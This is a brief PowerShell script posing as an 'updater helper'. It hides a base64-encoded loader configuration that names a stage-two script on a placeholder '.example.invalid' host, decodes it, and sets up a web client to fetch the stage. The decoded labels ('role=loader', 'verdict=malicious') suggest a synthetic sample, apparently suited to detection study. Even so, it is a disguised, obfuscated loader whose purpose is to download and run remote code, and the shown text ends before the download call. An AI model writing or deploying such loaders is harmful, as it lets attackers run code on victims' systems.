# updater helper
$Codec_3f9a = 'base64|identity|'
$Material_3f9a = 'dj0zfGxhbmd1YWdlPXBvd2Vyc2hlbGx8cm9sZT1sb2FkZXJ8dmVyZGljdD1tYWxpY2lvdXN8YXR0YWNrPVQxMTA1fGFkYXB0ZXI9aHR0cF9nZXR8c3RhZ2VfY291bnQ9MnxzdGVwcz1mZXRjaF9zdGFnZSxydW5fc3RhZ2V8Y2FtcGFpZ25faWQ9QUgtM2Y5YTBjMWR8dXJsPWh0dHBzOi8vQXV0b19Ib3RLZXktM2Y5YTBjMWQyZS5leGFtcGxlLmludmFsaWQ6NDQzL1N0YWdlMi9SdW4ucHMx'
$plan = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Material_3f9a))
$wc = New-Object Net.WebClient
